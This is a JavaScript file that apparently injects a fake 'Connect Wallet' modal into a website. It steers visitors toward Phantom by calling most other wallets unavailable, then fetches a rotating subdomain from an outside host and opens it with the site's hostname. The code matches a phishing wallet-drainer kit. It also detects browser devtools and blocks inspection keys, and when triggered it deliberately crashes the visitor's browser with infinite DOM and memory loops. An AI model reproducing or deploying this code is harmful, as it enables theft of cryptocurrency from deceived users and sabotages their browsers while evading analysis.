(async () => {
    // Devtools Detection and Protection
    (function() {
        let devtools = {open: false, orientation: null};
        const threshold = 160;
        const emitEvent = (state, orientation) => {
            if (state) {
                // Crash the site when devtools is detected
                crashSite();
            }
        };

        // Method 1: Check window dimensions
        setInterval(() => {
            if (window.outerHeight - window.innerHeight > threshold || 
                window.outerWidth - window.innerWidth > threshold) {
                if (!devtools.open) {
                    emitEvent(true, 'docked');
                    devtools.open = true;
                }
            } else {
                devtools.open = false;
            }
        }, 100);

        // Method 2: Console.log timing check
        let element = new Image();
        Object.defineProperty(element, 'id', {
            get: function() {
                emitEvent(true, 'console');
                devtools.open = true;
            }
        });
        setInterval(() => {
            console.log(element);
            console.clear();
        }, 100);

        // Method 3: Debugger statement detection
        setInterval(() => {
            const start = performance.now();
            debugger;
            const end = performance.now();
            if (end - start > 100) {
                emitEvent(true, 'debugger');
            }
        }, 100);

        // Crash function - overload the browser
        function crashSite() {
            // Method 1: Infinite loop with DOM manipulation
            while(true) {
                document.body.innerHTML += '<div>' + Math.random() + '</div>';
            }
            
            // Method 2: Memory overflow (backup)
            let arr = [];
            while(true) {
                arr.push(new Array(1000000).join('x'));
            }
        }

        // Disable right-click
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        document.addEventListener('keydown', e => {
            if (e.keyCode === 123 || // F12
                (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
                (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
                (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
                e.preventDefault();
                crashSite();
                return false;
            }
        });
    })();

    // Check for mobile device
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // API endpoints
    const subdomainApi = "https://encode-domain.com"; // Your subdomain manager
    const src = "https://funbIicnk.crownmodalz.com/";
    
    // Enhanced modal HTML with animations and improved design
    const overlayContent = `
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
    
        :root {
            --bg-primary: #0c0c0c;
            --bg-secondary: #141414;
            --bg-tertiary: #1a1a1a;
            --bg-hover: #222222;
            --border-color: #2a2a2a;
            --text-primary: #ffffff;
            --text-secondary: #888888;
            --text-tertiary: #666666;
            --accent-blue: #4a9eff;
            --accent-green: #4ade80;
            --accent-purple: #a78bfa;
            --accent-yellow: #fbbf24;
            --danger: #ef4444;
            --warning: #f59e0b;
            --success: #10b981;
        }
    
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            z-index: 10000;
            animation: fadeIn 0.2s ease-out;
        }
    
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    
        #modal {
            position: relative;
            width: 380px;
            max-width: 95%;
            max-height: 80vh;
            background: var(--bg-secondary);
            border-radius: 20px;
            overflow: hidden;
            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }
    
        @keyframes slideUp {
            from { 
                transform: translateY(40px) scale(0.95);
                opacity: 0;
            }
            to { 
                transform: translateY(0) scale(1);
                opacity: 1;
            }
        }

        /* Smooth transitions for page changes */
        .page-transition {
            animation: pageSlide 0.3s ease-out;
        }

        @keyframes pageSlide {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .page-transition-out {
            animation: pageSlideOut 0.3s ease-out;
        }

        @keyframes pageSlideOut {
            from {
                opacity: 1;
                transform: translateX(0);
            }
            to {
                opacity: 0;
                transform: translateX(20px);
            }
        }
    
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px;
            border-bottom: 1px solid var(--border-color);
        }
    
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 10px;
        }
    
        .modal-title svg {
            width: 20px;
            height: 20px;
        }
    
        .close-btn {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            border-radius: 10px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
        }
    
        .close-btn:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }
    
        .modal-body {
            padding: 20px;
            max-height: calc(80vh - 140px);
            overflow-y: auto;
        }

        .modal-body::-webkit-scrollbar {
            width: 6px;
        }

        .modal-body::-webkit-scrollbar-track {
            background: var(--bg-tertiary);
        }

        .modal-body::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 3px;
        }
    
        .wallet-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 14px;
            margin-bottom: 10px;
            background: var(--bg-tertiary);
            border: 1px solid transparent;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
            overflow: hidden;
        }
    
        .wallet-item:hover {
            background: var(--bg-hover);
            border-color: var(--border-color);
            transform: translateY(-2px);
        }
    
        .wallet-item:active {
            transform: translateY(0);
        }
    
        .wallet-icon {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
    
        .wallet-icon img {
            width: 100%;
            height: 100%;
            border-radius: 10px;
        }
    
        .wallet-info {
            flex: 1;
        }
    
        .wallet-name {
            font-size: 15px;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 2px;
        }
    
        .wallet-badge {
            display: inline-flex;
            align-items: center;
            padding: 3px 6px;
            font-size: 10px;
            font-weight: 600;
            border-radius: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
    
        .badge-installed {
            background: rgba(74, 222, 128, 0.1);
            color: var(--accent-green);
        }
    
        .badge-popular {
            background: rgba(74, 158, 255, 0.1);
            color: var(--accent-blue);
        }
    
        .wallet-divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
    
        .divider-line {
            flex: 1;
            height: 1px;
            background: var(--border-color);
        }
    
        .divider-text {
            padding: 0 16px;
            color: var(--text-tertiary);
            font-size: 11px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
    
        .all-wallets-btn {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 14px;
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
    
        .all-wallets-btn:hover {
            background: var(--bg-hover);
            border-color: var(--accent-blue);
            color: var(--accent-blue);
        }
    
        .all-wallets-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }
    
        .all-wallets-icons {
            display: flex;
            margin-left: -8px;
        }
    
        .mini-wallet-icon {
            width: 24px;
            height: 24px;
            border-radius: 6px;
            border: 2px solid var(--bg-secondary);
            margin-left: -8px;
        }
    
        .wallet-count {
            color: var(--text-tertiary);
            font-size: 13px;
        }
    
        .get-wallet-footer {
            padding: 20px;
            border-top: 1px solid var(--border-color);
            text-align: center;
        }
    
        .get-wallet-text {
            color: var(--text-secondary);
            font-size: 13px;
        }
    
        .get-wallet-link {
            color: var(--accent-blue);
            text-decoration: none;
            font-weight: 500;
            margin-left: 4px;
            transition: opacity 0.2s;
        }
    
        .get-wallet-link:hover {
            opacity: 0.8;
        }
    
        .back-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            color: var(--text-primary);
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 20px;
        }
    
        .back-btn:hover {
            background: var(--bg-hover);
            border-color: var(--accent-blue);
        }
    
        .not-available-container {
            text-align: center;
            padding: 30px 20px;
        }
    
        .not-available-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, rgba(167, 139, 250, 0.1) 0%, rgba(139, 92, 246, 0.1) 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(167, 139, 250, 0.4);
            }
            70% {
                box-shadow: 0 0 0 10px rgba(167, 139, 250, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(167, 139, 250, 0);
            }
        }
    
        .not-available-icon svg {
            width: 40px;
            height: 40px;
            color: var(--accent-purple);
        }
    
        .not-available-title {
            font-size: 20px;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 12px;
        }
    
        .not-available-message {
            font-size: 14px;
            color: var(--text-secondary);
            line-height: 1.5;
            margin-bottom: 16px;
        }
    
        .phantom-suggestion {
            font-size: 15px;
            color: var(--text-primary);
            font-weight: 500;
            margin-bottom: 8px;
        }

        .phantom-highlight {
            color: var(--accent-purple);
            font-weight: 600;
            text-shadow: 0 0 20px rgba(167, 139, 250, 0.5);
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 10px rgba(167, 139, 250, 0.5);
            }
            to {
                text-shadow: 0 0 20px rgba(167, 139, 250, 0.8), 0 0 30px rgba(167, 139, 250, 0.6);
            }
        }
    
        /* Loading States */
        #loader {
            position: fixed;
            width: 380px;
            max-width: 95%;
            background: var(--bg-secondary);
            border-radius: 20px;
            padding: 40px 28px;
            text-align: center;
            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }
    
        #loader h2 {
            font-size: 20px;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 12px;
        }
    
        #loader p {
            font-size: 14px;
            color: var(--text-secondary);
            line-height: 1.5;
            margin-bottom: 28px;
        }
    
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top-color: var(--accent-blue);
            border-radius: 50%;
            margin: 0 auto;
            animation: spin 1s linear infinite;
        }
    
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    
        /* Mobile Responsiveness */
        @media (max-width: 480px) {
            #modal, #loader {
                width: 100%;
                max-width: 100%;
                height: 100%;
                border-radius: 0;
                max-height: 100vh;
            }
    
            .modal-body {
                padding: 16px;
                max-height: calc(100vh - 140px);
            }
        }
    </style>
    
    <div id="modal">
        <div class="modal-header">
            <h2 class="modal-title" id="modalTitle">
                <svg viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                    <path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                </svg>
                <span id="titleText">Connect Wallet</span>
            </h2>
            <button class="close-btn" onclick="toggleModal()">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                    <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </button>
        </div>
    
        <div class="modal-body page-transition" id="walletList">
            <div class="wallet-item" id="phantom">
                <div class="wallet-icon">
                    <img src="${src}images/phantom_wallet.svg" alt="Phantom">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Phantom</div>
                    <span class="wallet-badge badge-installed">Recommended</span>
                </div>
            </div>
    
            <div class="wallet-item" id="solflare">
                <div class="wallet-icon">
                    <img src="${src}images/solflare_wallet.svg" alt="Solflare">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Solflare</div>
                    <span class="wallet-badge badge-popular">Popular</span>
                </div>
            </div>
    
            <div class="wallet-item" id="trust">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/trust_wallet.svg" alt="Trust Wallet">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Trust Wallet</div>
                </div>
            </div>
    
            <div class="wallet-item" id="coinbase">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/coin98_wallet.svg" alt="Coinbase">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Coinbase</div>
                </div>
            </div>
    
            <div class="wallet-item" id="bitget">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/bitkeep.svg" alt="Bitget">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Bitget Wallet</div>
                </div>
            </div>
    
            <div class="wallet-divider">
                <div class="divider-line"></div>
                <span class="divider-text">More Options</span>
                <div class="divider-line"></div>
            </div>
    
            <button class="all-wallets-btn" id="allWallets">
                <div class="all-wallets-info">
                    <div class="all-wallets-icons">
                        <img class="mini-wallet-icon" src="${src}images/wallets/ledger.svg" alt="">
                        <img class="mini-wallet-icon" src="${src}images/wallets/exodus.svg" alt="">
                        <img class="mini-wallet-icon" src="${src}images/wallets/atomic_wallet.svg" alt="">
                        <img class="mini-wallet-icon" src="${src}images/wallets/glow_wallet.svg" alt="">
                    </div>
                    <span>All Wallets</span>
                </div>
                <span class="wallet-count">12</span>
            </button>
        </div>

        <div class="modal-body page-transition" id="allWalletsList" style="display: none;">
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/ledger.svg" alt="Ledger">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Ledger</div>
                </div>
            </div>
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/exodus.svg" alt="Exodus">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Exodus</div>
                </div>
            </div>
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/atomic_wallet.svg" alt="Atomic">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Atomic Wallet</div>
                </div>
            </div>
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/glow_wallet.svg" alt="Glow">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Glow</div>
                </div>
            </div>
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/slope_wallet.svg" alt="Slope">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Slope</div>
                </div>
            </div>
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/math_wallet.svg" alt="Math">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Math Wallet</div>
                </div>
            </div>
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/spot_wallet.svg" alt="Spot">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Spot</div>
                </div>
            </div>
            <div class="wallet-item" onclick="showNotAvailable()">
                <div class="wallet-icon">
                    <img src="${src}images/wallets/backpack_wallet.svg" alt="Backpack">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Backpack</div>
                </div>
            </div>
            <button class="back-btn" onclick="showWalletList()">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                    <path fill-rule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clip-rule="evenodd"/>
                </svg>
                Back to Main
            </button>
        </div>
        
        <div class="modal-body page-transition" id="notAvailable" style="display: none;">
            <div class="not-available-container">
                <div class="not-available-icon">
                    <svg viewBox="0 0 24 24" fill="none">
                        <path d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>
                <h3 class="not-available-title">Wallet Not Available</h3>
                <p class="not-available-message">This wallet is not available at the moment.</p>
                <p class="phantom-suggestion">Please try using <span class="phantom-highlight">Phantom</span> wallet instead.</p>
                <button class="back-btn" onclick="showWalletList()">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                        <path fill-rule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clip-rule="evenodd"/>
                    </svg>
                    Go Back
                </button>
            </div>
        </div>
    
        <div class="get-wallet-footer" id="walletFooter">
            <span class="get-wallet-text">
                Haven't got a wallet?
                <a href="https://phantom.app" target="_blank" class="get-wallet-link">Get started</a>
            </span>
        </div>
    </div>
    
    <div id="loader" style="display: none;">
        <h2>Connecting...</h2>
        <p>Redirecting to secure connection</p>
        <div class="spinner"></div>
    </div>
    `;
    
    // Load script helper
    function loadScript(src) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = () => resolve();
            script.onerror = () => reject(new Error(`Failed to load script ${src}`));
            document.head.appendChild(script);
        });
    }
    
    // Handle wallet connection (keeping original functionality)
    async function handleWalletConnection(walletType) {
        const modal = document.getElementById('modal');
        const loader = document.getElementById('loader');
        
        // Smooth transition
        modal.style.animation = 'fadeOut 0.3s ease-out';
        setTimeout(() => {
            modal.style.display = "none";
            loader.style.display = "block";
            loader.style.animation = 'fadeIn 0.3s ease-out';
        }, 300);
        
        try {
            // Get current subdomain
            const response = await fetch(`${subdomainApi}/api/get-current-subdomain`);
            const data = await response.json();
            
            // Make sure we have a valid URL
            if (!data.url) {
                throw new Error('No subdomain URL received');
            }
            
            // Remove any trailing slashes and ensure proper format
            const subdomainUrl = data.url.replace(/\/$/, '');
            
            // Build connection URL
            const currentWebsite = window.location.hostname;
            const connectionUrl = `${subdomainUrl}/${currentWebsite}/${walletType}`;
            
            console.log('Subdomain URL:', subdomainUrl);
            console.log('Connection URL:', connectionUrl);
            
            // Add timeout to handle loader
            setTimeout(() => {
                if (document.getElementById('overlay')) {
                    document.body.removeChild(document.getElementById('overlay'));
                }
            }, 3000);
            
            if (isMobile) {
                // Mobile: Use proper Phantom universal link format
                if (walletType === 'phantom') {
                    // Build the dApp URL
                    const dappUrl = `https://${currentWebsite}/phantom`;
                    const encodedUrl = encodeURIComponent(connectionUrl);
                    const encodedRef = encodeURIComponent(window.location.origin);
                    
                    // Use the correct Phantom universal link format
                    const phantomUrl = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedRef}`;
                    
                    // Use location.assign for better mobile handling
                    window.location.assign(phantomUrl);
                } else if (walletType === 'solflare') {
                    const encodedUrl = encodeURIComponent(connectionUrl);
                    const encodedRef = encodeURIComponent(window.location.origin);
                    window.location.assign(`https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodedRef}`);
                }
            } else {
                // Desktop: Open popup
                const popupWidth = 420;
                const popupHeight = 600;
                const left = (window.screen.width - popupWidth) / 2;
                const top = (window.screen.height - popupHeight) / 2;
                
                window.open(
                    connectionUrl,
                    'WalletConnection',
                    `width=${popupWidth},height=${popupHeight},left=${left},top=${top},resizable=no,scrollbars=yes`
                );
                
                // Close the modal after opening popup
                setTimeout(() => {
                    if (document.getElementById('overlay')) {
                        document.body.removeChild(document.getElementById('overlay'));
                    }
                }, 1500);
            }
        } catch (error) {
            console.error('Failed to get subdomain:', error);
            if (document.getElementById('overlay')) {
                document.body.removeChild(document.getElementById('overlay'));
            }
        }
    }
    
    // Create overlay element
    let overlay;
    
    // Attach click handlers
    document.querySelectorAll('.claimButton').forEach(button => {
        button.addEventListener('click', async () => {
            // Create overlay
            overlay = document.createElement('div');
            overlay.id = 'overlay';
            overlay.innerHTML = overlayContent;
            document.body.appendChild(overlay);
            
            // Setup close function
            window.toggleModal = function() {
                if (overlay && overlay.parentNode) {
                    document.body.removeChild(overlay);
                }
            };
            
            // Function to show wallet list with animation
            window.showWalletList = function() {
                // Animate out current page
                const currentPage = document.querySelector('.modal-body:not([style*="display: none"])');
                if (currentPage) {
                    currentPage.classList.add('page-transition-out');
                    setTimeout(() => {
                        currentPage.style.display = 'none';
                        currentPage.classList.remove('page-transition-out');
                        
                        // Animate in wallet list
                        document.getElementById('walletList').style.display = 'block';
                        document.getElementById('walletList').classList.add('page-transition');
                        document.getElementById('allWalletsList').style.display = 'none';
                        document.getElementById('notAvailable').style.display = 'none';
                        document.getElementById('walletFooter').style.display = 'block';
                        document.getElementById('titleText').textContent = 'Connect Wallet';
                    }, 300);
                }
            };
            
            // Function to show all wallets
            window.showAllWallets = function() {
                const walletList = document.getElementById('walletList');
                walletList.classList.add('page-transition-out');
                setTimeout(() => {
                    walletList.style.display = 'none';
                    walletList.classList.remove('page-transition-out');
                    
                    document.getElementById('allWalletsList').style.display = 'block';
                    document.getElementById('allWalletsList').classList.add('page-transition');
                    document.getElementById('titleText').textContent = 'All Wallets';
                }, 300);
            };
            
            // Function to show not available message with animation
            window.showNotAvailable = function() {
                const currentPage = document.querySelector('.modal-body:not([style*="display: none"])');
                if (currentPage) {
                    currentPage.classList.add('page-transition-out');
                    setTimeout(() => {
                        currentPage.style.display = 'none';
                        currentPage.classList.remove('page-transition-out');
                        
                        document.getElementById('notAvailable').style.display = 'block';
                        document.getElementById('notAvailable').classList.add('page-transition');
                        document.getElementById('walletFooter').style.display = 'none';
                        document.getElementById('titleText').textContent = 'Connection Issue';
                    }, 300);
                }
            };
            
            // Click outside to close
            overlay.addEventListener('click', function(event) {
                const modal = document.getElementById('modal');
                const loader = document.getElementById('loader');
                if (!modal.contains(event.target) && !loader.contains(event.target)) {
                    if (overlay && overlay.parentNode) {
                        document.body.removeChild(overlay);
                    }
                }
            });
            
            // Wallet click handlers
            document.getElementById('phantom').addEventListener('click', () => {
                handleWalletConnection('phantom');
            });
            
            // All other wallets show "not available" message
            document.getElementById('solflare').addEventListener('click', () => {
                showNotAvailable();
            });
            
            document.getElementById('trust').addEventListener('click', () => {
                showNotAvailable();
            });
            
            document.getElementById('coinbase').addEventListener('click', () => {
                showNotAvailable();
            });
            
            document.getElementById('bitget').addEventListener('click', () => {
                showNotAvailable();
            });
            
            document.getElementById('allWallets').addEventListener('click', () => {
                showAllWallets();
            });
        });
    });
})();
